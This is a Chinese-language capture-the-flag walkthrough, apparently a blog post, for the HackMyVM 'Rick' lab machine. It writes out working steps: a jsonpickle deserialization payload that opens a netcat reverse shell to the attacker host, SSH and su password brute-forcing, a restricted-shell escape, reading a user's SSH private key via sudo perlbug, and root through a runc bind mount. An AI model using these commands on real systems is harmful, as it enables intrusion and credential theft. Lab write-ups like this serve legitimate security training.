<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/xsJrJvlVKNmbJu61I3gihw)

 ![](http://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUsGamtQXiblwiaPhT11gUfcWibGaGzbdzpL0N1UGmGdGP78y7DW7sCUOicTibjbBZHrHewj9uP2Tx3yPiaw/0?wx_fmt=png) ** 伏波路上学安全 ** 专注于渗透测试、代码审计等安全技术，分享安全知识. 99篇原创内容   公众号

![图片](https://mmbiz.qpic.cn/mmbiz_png/7gUQD4TbLUugfcmhRRO2Cm9qMJ3llghAu4tGxzQgIcRsAbiaYRvX87t2ujS9BX4v0GAhZG3COE2TAaw09m1WGhg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)

```
`靶机信息``下载地址:``https://hackmyvm.eu/machines/machine.php?vm=Rick``网盘链接：https://pan.baidu.com/s/1OjMwuU6F1V98x2UnLz-eHA?pwd=xcvx``靶场: HackMyVm.eu``靶机名称: Rick``难度: 困难``发布时间: 2021年11月28日``提示信息:``无``目标:  user.txt和root.txt`
```

```
`实验环境``攻击机:Vbox Manjaro 10.0.0.3 eth0桥接互联网，eth1桥接vbox-Host-Only``靶机:Vbox linux IP自动获取 网卡host-Only`
```

信息收集
----

### 扫描主机

扫描局域网内的靶机IP地址

```
fping -ag 10.0.0.0/24 2>/dev/null
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

扫描到主机地址为10.0.0.176

### 扫描端口

扫描靶机开放的服务端口

```
sudo nmap -sC -sV -p- 10.0.0.176 -oN nmap.log
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

扫描到22、80、5000端口开放，先来看看80端口

Web渗透
-----

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

访问后是apache默认页面，做个目录扫描暴破敏感路径

```
gobuster dir -u http://10.0.0.176 -w ../../Dict/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php,html,txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

没有可利用的信息，再来看看5000端口，从nmap扫描中可以看到这个端口是python2.7.16环境下的HTTP服务，先来访问

```
http://10.0.0.176:5000/
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

访问后在cookie中发现一段base64编码后的内容，先来解一下看看

```
echo 'eyJweS9vYmplY3QiOiAiX19tYWluX18uVXNlciIsICJ1c2VybmFtZSI6ICJSaWNrIn0=' |base64 -d
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

解码后是序列化的内容，尝试反序列化执行命令，先来找个exp

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

github上找到一个可以生成payload的仓库，下载下来验证下

```
https://github.com/j0lt-github/python-deserialization-attack-payload-generator
```

1。生成payload  

```
`py3 exp.py``nc 10.0.0.3 4444 -e /bin/bash``y``jsonpickle`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

2。攻击机监听4444端口

nc -lvvp 4444

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

3。执行payload

```
curl --cookie "user  http://10.0.0.176:5000
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

反弹成功，先切换到交互式shell

```
`python3 -c 'import pty;pty.spawn("/bin/bash")'``export TERM=xterm``Ctrl+z快捷键``stty raw -echo;fg``reset`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

切换完成，来找找敏感信息

cat /etc/passwd |grep bash

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

找到2个用户，继续

```
`cd /home/morty``ls -al``cat .important`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

发现一段留言，提示说morty的密码太简单，尝试SSH暴破

```
hydra -l morty -P ../../Dict/password.txt ssh://10.0.0.176
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

暴破失败，提示不支持密码登录，只能在本地通过su切换用户来暴破了，先找个脚本和字典

1。暴破脚本地址

```
https://github.com/fernando-cg/SuCrack
```

2。攻击机上字典目录下开启HTTP服务  

```
cd /home/m/HackTools/Dict/SecLists/Passwords
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

3。靶机下载字典

```
wget http://10.0.0.3:8000/darkweb2017-top1000.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

4。开始暴破密码

```
python3 sucrack.py darkweb2017-top1000.txt morty |grep -v 'Incorrect'
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

轻松拿到密码，切换到morty账号

```
su morty
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

登录成功，来找找敏感信息

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

无法执行命令，原来是rbash(受限制的bash)，尝试绕过

1。使用vi随便打开一个文件输入:!bash并回车，反回的就是一个正常的bash

```
`vi aaa``:!bash`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

绕过后继续查找敏感信息

```
sudo -l
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)  

  

发现可以使用rick身份执行/usr/bin/perlbug命令，在网上找了很久，发现这个命令可以读取文件，验证一下

```
`sudo -u rick perlbug -f /home/rick/.ssh/id_rsa``aaa a  #可以输入任意字符，但中间一定要有一个空格。应该是一个名称加一个描述。``#一路回车到Action (Send/Display/Edit/Subject/Save to File)位置，输入大写的D即可`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

输入后会输出一些配置信息，直接往前找到key即可

将key保存下来登录SSH验证

```
`vi rick_rsa``chmod 600 rick_rsa``ssh -i rick_rsa rick@10.0.0.176`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

登录成功，继续收集感信息

```
`ls -al``cat user.txt`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

拿到user.txt，继续

```
sudo -l
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

发现可以使用root身份执行runc(runc提权可以看公众号的第45篇文章)，来验证一下。

```
`mkdir bundle``cd bundle``mkdir rootfs``/usr/sbin/runc spec``vi config.json`
```

config.json中mounts下面添加

```
`{` `"type": "bind",` `"source": "/",` `"destination": "/",` `"options": [ "rbind", "rw", "rprivate" ]``},`
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

提权

```
sudo /usr/sbin/runc run bundle
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

提权成功，来找找flag

```
cat /root/root.txt
```

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

  

拿到root.txt，游戏结束

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![图片](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)